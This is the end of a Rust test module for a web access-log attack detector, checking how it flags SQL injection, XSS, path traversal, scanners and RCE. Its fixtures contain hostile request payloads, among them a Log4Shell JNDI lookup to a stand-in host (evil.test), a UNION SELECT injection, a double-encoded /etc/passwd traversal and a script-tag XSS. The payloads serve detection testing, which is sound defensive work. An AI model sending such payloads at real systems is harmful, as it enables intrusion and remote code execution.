        assert!(flat.contains("sqli 1 critical"), "{out}");
        assert!(flat.contains("traversal 1 high"), "{out}");
        assert!(flat.contains("xss 1 high"), "{out}");
        assert!(flat.contains("probe 1 low"), "{out}");
        assert!(out.contains("scanner UA: sqlmap/1.7#stable"), "{out}");
        assert!(
            flat.contains("203.0.113.5 2 req · 2 flagged · 1×404 · 0×401/403"),
            "{out}"
        );
    }

    #[test]
    fn percent_encoded_payloads_only_match_when_decoding_is_on() {
        let line = r#"198.51.100.22 - - [11/Mar/2024:09:14:20 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 980 "-" "Mozilla/5.0""#;
        let on = analyze(line, "xss", "all", "json", 0, 0, true, 0).unwrap();
        assert!(on.contains("\"category\": \"xss\""), "{on}");
        assert!(on.contains("\"decoded\": true"), "{on}");

        let off = analyze(line, "xss", "all", "json", 0, 0, false, 0).unwrap();
        // `alert(` is literal in the raw target, so the request is still XSS —
        // but the `<script` signature only appears once decoded.
        assert!(off.contains("script tag") == false, "{off}");
    }

    #[test]
    fn double_encoded_traversal_is_caught() {
        let line = r#"203.0.113.9 - - [11/Mar/2024:10:00:00 +0000] "GET /f?p=%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 10 "-" "curl/8.0""#;
        let out = analyze(line, "traversal", "all", "table", 0, 0, true, 0).unwrap();
        assert!(out.contains("| traversal |"), "{out}");
        assert!(out.contains("dot-dot-slash"), "{out}");
    }

    #[test]
    fn iis_w3c_lines_are_parsed() {
        let logs = "#Software: Microsoft Internet Information Services 10.0\n\
                    #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status\n\
                    2024-03-11 09:14:02 10.0.0.4 GET /products.aspx id=1'+union+select+null,@@version-- 80 - 203.0.113.5 sqlmap/1.7 200";
        let out = analyze(logs, "all", "all", "report", 0, 0, true, 0).unwrap();
        assert!(
            out.contains("· iis · 1 requests · 1 flagged · 1 source IPs"),
            "{out}"
        );
        assert!(out.contains("203.0.113.5"), "{out}");
        assert!(out.contains("union select"), "{out}");
    }

    #[test]
    fn common_format_without_user_agent_is_detected() {
        let logs =
            r#"10.0.0.1 - frank [11/Mar/2024:09:00:00 +0000] "GET /index.html HTTP/1.0" 200 2326"#;
        let (_, format, _) = parse_lines(logs);
        assert_eq!(format, "common");
    }

    #[test]
    fn offender_flags_respect_thresholds() {
        let mut logs = String::new();
        for i in 0..6 {
            logs.push_str(&format!(
                "203.0.113.5 - - [11/Mar/2024:09:00:0{i} +0000] \"GET /missing{i} HTTP/1.1\" 404 0 \"-\" \"Mozilla/5.0\"\n"
            ));
        }
        let out = analyze(&logs, "all", "all", "report", 4, 5, true, 0).unwrap();
        assert!(out.contains("flags: high-volume, enumeration"), "{out}");

        let relaxed = analyze(&logs, "all", "all", "report", 50, 50, true, 0).unwrap();
        assert!(relaxed.contains("flags: -"), "{relaxed}");
    }

    #[test]
    fn min_severity_filters_out_low_and_medium() {
        let out = analyze(COMBINED, "all", "critical", "csv", 0, 0, true, 0).unwrap();
        let rows: Vec<&str> = out.lines().skip(1).filter(|l| !l.is_empty()).collect();
        assert_eq!(rows.len(), 1, "{out}");
        assert!(rows[0].contains("critical,sqli,203.0.113.5"), "{out}");
    }

    #[test]
    fn limit_truncates_and_says_so() {
        let out = analyze(COMBINED, "all", "all", "report", 0, 0, true, 2).unwrap();
        assert!(
            out.contains("(showing the first 2 of 4 matching findings"),
            "{out}"
        );
    }

    #[test]
    fn clean_log_reports_no_findings() {
        let logs = r#"10.0.0.1 - - [11/Mar/2024:09:00:00 +0000] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0""#;
        let out = analyze(logs, "all", "all", "report", 0, 0, true, 0).unwrap();
        assert!(out.contains("0 flagged"), "{out}");
        assert!(out.contains("(none matched the current filters)"), "{out}");
    }

    #[test]
    fn empty_input_is_an_error() {
        let err = analyze("   \n\n", "all", "all", "report", 0, 0, true, 0).unwrap_err();
        assert!(err.contains("no log text"), "{err}");
    }

    #[test]
    fn unrecognised_lines_are_an_error_naming_the_expected_shape() {
        let err = analyze(
            "hello world\nnot a log",
            "all",
            "all",
            "report",
            0,
            0,
            true,
            0,
        )
        .unwrap_err();
        assert!(err.contains("no access-log requests recognised"), "{err}");
        assert!(err.contains("\"hello world\""), "{err}");
    }

    #[test]
    fn bad_enum_values_are_named() {
        assert!(analyze("x", "nope", "all", "report", 0, 0, true, 0)
            .unwrap_err()
            .contains("unknown category \"nope\""));
        assert!(analyze("x", "all", "urgent", "report", 0, 0, true, 0)
            .unwrap_err()
            .contains("unknown min_severity \"urgent\""));
        assert!(analyze("x", "all", "all", "yaml", 0, 0, true, 0)
            .unwrap_err()
            .contains("unknown output \"yaml\""));
    }

    #[test]
    fn quoted_user_agent_with_escaped_quote_still_parses() {
        let line = r#"203.0.113.5 - - [11/Mar/2024:09:14:02 +0000] "GET /x HTTP/1.1" 200 5 "-" "Bot \"friendly\" nikto/2.5""#;
        let out = analyze(line, "scanner", "all", "json", 0, 0, true, 0).unwrap();
        assert!(out.contains("\"category\": \"scanner\""), "{out}");
        assert!(out.contains("nikto"), "{out}");
    }

    #[test]
    fn log4shell_and_rce_payloads_are_critical() {
        let line = r#"203.0.113.44 - - [11/Mar/2024:11:00:00 +0000] "GET /?x=${jndi:ldap://evil.test/a} HTTP/1.1" 500 0 "-" "Mozilla/5.0""#;
        let out = analyze(line, "rce", "critical", "table", 0, 0, true, 0).unwrap();
        assert!(out.contains("| critical | rce |"), "{out}");
        assert!(out.contains("log4shell jndi"), "{out}");
    }

    #[test]
    fn percent_decode_handles_invalid_escapes() {
        assert_eq!(percent_decode("a%2fb"), "a/b");
        assert_eq!(percent_decode("a+b"), "a b");
        assert_eq!(percent_decode("100%"), "100%");
        assert_eq!(percent_decode("%zz"), "%zz");
    }
}
